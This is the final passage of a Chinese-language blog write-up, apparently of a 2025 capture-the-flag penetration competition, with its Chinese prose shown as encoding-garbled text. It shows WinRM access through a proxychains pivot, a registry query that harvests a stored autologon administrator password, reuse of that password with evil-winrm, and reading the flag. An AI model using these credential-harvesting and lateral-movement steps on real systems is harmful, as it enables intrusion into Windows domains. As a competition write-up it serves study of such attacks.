</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> Dynamic chain  ...  192.168.71.1:6666  ...  172.16.22.41:5985  ...  OK
</span></span><span style=display:flex><span>WINRM       172.16.22.41    <span style=color:#ae81ff>5985</span>   DC               <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> zwfw.com<span style=color:#ae81ff>\l</span>dapadmin:XpVLGkQHm8 <span style=color:#f92672>(</span>Pwn3d!<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>ç›´æ¥ç™»å½•</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains4 evil-winrm -i 172.16.22.41 -u ldapadmin -p <span style=color:#e6db74>&#39;XpVLGkQHm8&#39;</span>
</span></span></code></pre></div><p>è¿™é‡Œç»å…¸æµç¨‹æ¢æµ‹ä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>reg query <span style=color:#e6db74>&#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span>
</span></span></code></pre></div><p>ç»™åˆ°äº†å¯†ç </p><pre tabindex=0><code>
Name    REG_SZ    administrator
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    a4Z6FcRYSp6LLSGO

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ShellPrograms
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
</code></pre><p>ç›´æ¥ç™»å½•</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains4 evil-winrm -i 172.16.22.41 -u administrator -p <span style=color:#e6db74>&#39;a4Z6FcRYSp6LLSGO&#39;</span>
</span></span></code></pre></div><p>æ‹¿åˆ°flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>ocuments&gt; cat C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\f</span>*
</span></span></code></pre></div><h1 id=åè¯>åè¯</h1><p>å¥½ä¹…æ²¡æ°´æ–‡ç« äº†ï¼Œå¥½å¤šå¹´æ²¡æ°´äº†ï¼Œä¼ ä¸€ç¯‡ï¼Œç°åœºå…¶å®ä¹Ÿæ‰“äº†ï¼Œæ¼æ´ä¹Ÿæ‰¾åˆ°äº†ï¼Œæ‰‹ä¸Šå½“æ—¶æ²¡å·¥å…·ï¼Œç¡®å®æœ‰äº›éš¾å´©ï¼Œå…¶ä»–å°±ä¸ç»†è¯´äº†ã€‚æ–‡ç« å¥½å¤šæˆªå›¾éƒ½æ²¡æ”¾ï¼Œç–‘ä¼¼ç”µè„‘å¼€äº†hdrå¯¼è‡´edgeæµè§ˆå™¨æˆªå›¾å¼‚å¸¸æ›å…‰ï¼Œè¿˜æœ‰æˆ‘æ‡’ã€‚see you later.<img alt=wink loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall2025/wink.gif></p></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">ç›®å½•</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>ç›®å½•</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">Ã—</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#ä»‹ç»>ä»‹ç»</a></li><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3>flag3</a></li><li><a href=#flag4>flag4</a></li><li><a href=#åè¯>åè¯</a></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://blog.0ran9e.cn/posts/ctf/rctf2025/><span class=title>Â«</span><br><span>RCTF2025-Misc</span>
</a><a class=next href=http://blog.0ran9e.cn/posts/ctf/%E9%99%87%E5%89%91%E6%9D%AF2025-siem/><span class=title>Â»</span><br><span>é™‡å‰‘æ¯2025-siem</span></a></nav></article></main><footer class=footer><span>Â© 2026
<a href=http://blog.0ran9e.cn/>0raN9e's Blog</a>Â· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>Â· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer><button id=tocToggleBtn type=button aria-label="Toggle Table of Contents">æ”¶èµ·</button>
<script>(function(){const s=document.querySelector("article.post-single > details.toc"),e=document.getElementById("tocToggleBtn");if(!s||!e){e&&(e.style.display="none");return}const t="toc_hidden",n=()=>{const n=localStorage.getItem(t)==="1";document.documentElement.classList.toggle("toc-hidden",n),e.textContent=n?"ç›®å½•":"æ”¶èµ·"};e.addEventListener("click",()=>{const e=!document.documentElement.classList.contains("toc-hidden");localStorage.setItem(t,e?"1":"0"),n()}),n()})()</script><script>(function(){const t=document.getElementById("theme-toggle");if(!t)return;const s="pref-theme",e=document.documentElement,n=t=>{const n=t==="dark";e.classList.toggle("dark",n);try{localStorage.setItem(s,t)}catch{}e.style.display="none",e.offsetHeight,e.style.display=""},o=()=>{let e=null;try{e=localStorage.getItem(s)}catch{}if(e==="dark"||e==="light")return n(e);window.matchMedia&&n(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")};t.dataset.boundTheme||(t.addEventListener("click",()=>{const t=e.classList.contains("dark");n(t?"light":"dark")}),t.dataset.boundTheme="1"),o()})()</script></body></html>